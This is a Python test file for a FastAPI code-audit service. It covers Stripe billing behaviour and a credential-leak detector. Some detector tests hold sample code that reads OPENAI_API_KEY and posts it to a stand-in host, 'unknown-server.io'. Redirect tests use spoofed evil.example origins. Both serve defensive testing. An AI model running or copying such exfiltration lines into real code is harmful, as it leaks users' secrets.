import unittest
from unittest.mock import patch
from fastapi.testclient import TestClient
from starlette.requests import Request
import main

class BillingMigrationTests(unittest.TestCase):
 def test_paused_checkout_cannot_contact_stripe_or_create_customer(self):
  with patch.object(main,'PURCHASES_ENABLED',False),patch.object(main.stripe.checkout.Session,'create') as checkout,patch.object(main.stripe.Customer,'create') as customer:
   for headers in ({},{'Authorization':'Bearer arbitrary'}):
    response=TestClient(main.app).post('/stripe/create-checkout-session',headers=headers)
    self.assertEqual(response.status_code,503)
    self.assertIn('paused',response.json()['detail'])
   checkout.assert_not_called();customer.assert_not_called()
 def test_terminal_status_cannot_be_revived_by_stale_cancellation_date(self):
  for status in ['canceled','unpaid','incomplete','incomplete_expired','paused','unknown']:
   self.assertEqual(main.plan_from_subscription_status(status,cancel_at_period_end=True,current_period_end=9999999999),'free')
 def test_scheduled_cancellation_keeps_active_access(self):
  self.assertEqual(main.plan_from_subscription_status('active',cancel_at_period_end=True,current_period_end=9999999999),'pro')
 def test_return_origin_allowlist(self):
  def req(origin): return Request({'type':'http','headers':[(b'x-audit-return-origin',origin.encode())]})
  with patch.object(main,'APP_BASE_URL','https://code-trust-check.onrender.com'):
   self.assertEqual(main.get_billing_return_url(req('https://ai-code-audit.samkiper.chatgpt.site')),'https://ai-code-audit.samkiper.chatgpt.site')
   for origin in ['https://aicodeaudit.org', 'https://www.aicodeaudit.org']:
    self.assertEqual(main.get_billing_return_url(req(origin)),origin)
   for origin in ['http://aicodeaudit.org','https://aicodeaudit.org.evil.example','https://aicodeaudit.org@evil.example','https://evil.example','https://ai-code-audit.samkiper.chatgpt.site.evil.example','https://ai-code-audit.samkiper.chatgpt.site@evil.example']:
    self.assertEqual(main.get_billing_return_url(req(origin)),'https://code-trust-check.onrender.com')
 def webhook(self,payment='paid',failure=False):
  event={'type':'checkout.session.completed','data':{'object':{'payment_status':payment,'subscription':'sub_existing','customer':'cus_existing','metadata':{'user_id':'user'}}}}
  with patch.object(main,'STRIPE_SECRET_KEY','test'),patch.object(main,'STRIPE_WEBHOOK_SECRET','test'),patch.object(main.stripe.Webhook,'construct_event',return_value=event),patch.object(main,'resolve_supabase_user_id_for_stripe_event',return_value='user'),patch.object(main.stripe.Subscription,'retrieve',side_effect=RuntimeError('offline') if failure else None,return_value={'status':'active'}),patch.object(main,'sync_user_plan_from_subscription',return_value=True) as sync:
   result=TestClient(main.app).post('/stripe/webhook',content=b'{}')
   return result,sync.call_count
 def test_unpaid_checkout_does_not_grant_access(self):
  response,calls=self.webhook(payment='unpaid');self.assertEqual(response.status_code,200);self.assertEqual(calls,0)
 def test_lookup_failure_retries_without_grant(self):
  response,calls=self.webhook(failure=True);self.assertEqual(response.status_code,503);self.assertEqual(calls,0)
 def test_verified_paid_checkout_syncs(self):
  response,calls=self.webhook();self.assertEqual(response.status_code,200);self.assertEqual(calls,1)

class CredentialSourceRegressionTests(unittest.TestCase):
 def test_isolated_environment_read_is_notice_even_with_unspecified_intent(self):
  result=main.analyze_code(code='import os\nkey = os.getenv("OPENAI_API_KEY")',intent='Read a local environment setting; do not transmit it.')
  sources=[flag for flag in result['flags'] if flag.get('pattern')=='environment_secret_access']
  self.assertTrue(sources)
  self.assertTrue(all(flag['severity']<8 for flag in sources))
 def test_exfiltration_keeps_high_severity(self):
  result=main.analyze_code(code='import os, requests\nkey = os.getenv("OPENAI_API_KEY")\nrequests.post("https://unknown-server.io/log",json={"key":key})',intent='Build a local report. Do not transmit credentials.')
  self.assertTrue(any(flag.get('pattern')=='secret_exfiltration_chain' and flag['severity']>=18 for flag in result['flags']))

 def test_inline_environment_egress_does_not_require_assignment(self):
  code='import os, requests\nrequests.post("https://unknown-server.io/log",json={"key":os.getenv("OPENAI_API_KEY")})'
  result=main.analyze_code(intent='Build a local report. Do not transmit credentials.',code=code)
  self.assertTrue(any(flag.get('pattern')=='secret_exfiltration_chain' and flag['severity']>=18 for flag in result['flags']))
 def test_expected_inline_auth_has_destination_and_header_evidence(self):
  code='import os, requests\nrequests.get("https://api.example.com/data",headers={"Authorization":os.getenv("API_KEY")})'
  result=main.analyze_code(intent='Authenticate to api.example.com using an API key in the authorization header.',code=code)
  self.assertFalse(any(flag.get('pattern')=='secret_exfiltration_chain' for flag in result['flags']))
  self.assertTrue(any(flag.get('pattern')=='credential_authentication' for flag in result['flags']))
 def test_negated_destination_does_not_authorize_inline_transmission(self):
  code='import os, requests\nrequests.get("https://api.example.com/data",headers={"Authorization":os.getenv("API_KEY")})'
  flags=main.inline_environment_egress(code,'Do not authenticate to api.example.com with any credential.')
  self.assertTrue(any(flag['severity']>=18 for flag in flags))

class WebhookPersistenceTests(unittest.TestCase):
 def deliver(self,event_type,*,sync_ok=True,lookup_error=False):
  obj={'id':'sub_test','customer':'cus_test','subscription':'sub_test','payment_status':'paid','status':'active','metadata':{'user_id':'test_user'}}
  event={'type':event_type,'data':{'object':obj}}
  with patch.object(main,'STRIPE_SECRET_KEY','test'),patch.object(main,'STRIPE_WEBHOOK_SECRET','test'),patch.object(main.stripe.Webhook,'construct_event',return_value=event),patch.object(main,'resolve_supabase_user_id_for_stripe_event',return_value='test_user'),patch.object(main.stripe.Subscription,'retrieve',side_effect=RuntimeError('offline') if lookup_error else None,return_value={'status':'active'}),patch.object(main,'sync_user_plan_from_subscription',return_value=sync_ok):
   return TestClient(main.app).post('/stripe/webhook',content=b'{}')
 def test_failed_persistence_retries_all_entitlement_event_types(self):
  for kind in ['checkout.session.completed','checkout.session.async_payment_succeeded','customer.subscription.created','customer.subscription.updated','customer.subscription.deleted','invoice.payment_failed','invoice.paid','invoice.payment_succeeded']:
   with self.subTest(event=kind):
    response=self.deliver(kind,sync_ok=False)
    self.assertEqual(response.status_code,503)
    self.assertFalse(response.json()['received'])
 def test_invoice_lookup_failure_is_not_acknowledged(self):
  for kind in ['invoice.payment_failed','invoice.paid','invoice.payment_succeeded']:
   with self.subTest(event=kind):
    self.assertEqual(self.deliver(kind,lookup_error=True).status_code,503)
 def test_successful_redelivery_acknowledged_after_persistence(self):
  for kind in ['checkout.session.completed','customer.subscription.updated','invoice.paid']:
   with self.subTest(event=kind):
    self.assertEqual(self.deliver(kind,sync_ok=False).status_code,503)
    response=self.deliver(kind,sync_ok=True)
    self.assertEqual(response.status_code,200)
    self.assertTrue(response.json()['received'])

class NormalBillingRouteTests(unittest.TestCase):
 def setUp(self):
  from contextlib import ExitStack
  self.stack=ExitStack();self.addCleanup(self.stack.close)
  access={'authenticated':True,'user_id':'customer_user','email':'customer@example.com','plan':'free','role':'user','debug':{'user_fetch_succeeded':True}}
  for name,value in [('get_request_access_context',access),('enrich_access_with_admin_metadata',access),('enforce_rate_limit',None),('get_supabase_admin_user',{'app_metadata':{'stripe_customer_id':'cus_existing'}})]:
   self.stack.enter_context(patch.object(main,name,return_value=value))
  self.stack.enter_context(patch.object(main,'STRIPE_SECRET_KEY','test'))
  self.stack.enter_context(patch.object(main,'STRIPE_PRICE_ID','price_test'))
  self.stack.enter_context(patch.object(main,'PURCHASES_ENABLED',True))
  self.client=TestClient(main.app)
  self.headers={'X-Audit-Return-Origin':'https://aicodeaudit.org'}
 def test_checkout_returns_to_billing_verification_page(self):
  from types import SimpleNamespace
  with patch.object(main.stripe.checkout.Session,'create',return_value=SimpleNamespace(url='https://checkout.stripe.com/test',id='cs_test_example')) as create:
   response=self.client.post('/stripe/create-checkout-session',headers=self.headers)
   self.assertEqual(response.status_code,200)
   args=create.call_args.kwargs
   self.assertEqual(args['success_url'],'https://aicodeaudit.org/account/billing?checkout=success&session_id={CHECKOUT_SESSION_ID}')
   self.assertEqual(args['cancel_url'],'https://aicodeaudit.org/account/billing?checkout=cancel')
   self.assertEqual(args['client_reference_id'],'customer_user')
 def test_portal_returns_to_billing_page(self):
  from types import SimpleNamespace
  with patch.object(main.stripe.billing_portal.Session,'create',return_value=SimpleNamespace(url='https://billing.stripe.com/test')) as create:
   response=self.client.post('/stripe/create-billing-portal-session',headers=self.headers)
   self.assertEqual(response.status_code,200)
   self.assertEqual(create.call_args.kwargs['return_url'],'https://aicodeaudit.org/account/billing')
 def test_recovery_lookup_failure_never_grants_paid_access(self):
  session={'status':'complete','payment_status':'paid','subscription':'sub_old','customer':'cus_existing','metadata':{'user_id':'customer_user'}}
  with patch.object(main.stripe.checkout.Session,'list',return_value={'data':[session]}),patch.object(main.stripe.Subscription,'retrieve',side_effect=RuntimeError('unavailable')),patch.object(main,'sync_user_plan_from_subscription') as sync:
   response=self.client.post('/stripe/reconcile-subscription',headers=self.headers)
   self.assertEqual(response.status_code,503)
   sync.assert_not_called()
